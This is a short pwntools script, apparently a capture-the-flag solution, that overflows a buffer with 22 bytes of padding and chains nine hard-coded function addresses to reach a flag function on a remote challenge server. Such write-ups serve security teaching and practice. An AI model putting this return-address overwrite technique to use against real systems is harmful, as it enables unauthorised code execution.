from pwn import *

pad = 'A' * 22
air = p32(0x08049216)
water = p32(0x804926d)
land  = p32(0x80492c4)
underground = p32(0x804931b)
limbo = p32(0x8049372)
hell = p32(0x80493c9)
mine = p32(0x8049420)
bedrock = p32(0x8049477)
flag  = p32(0x8049569)

exploit  = pad+air+water+land+underground+limbo+hell+mine+bedrock+flag
p = remote('chall.2019.redpwn.net', 4005)
p.recvline()
p.sendline(exploit)
p.interactive()
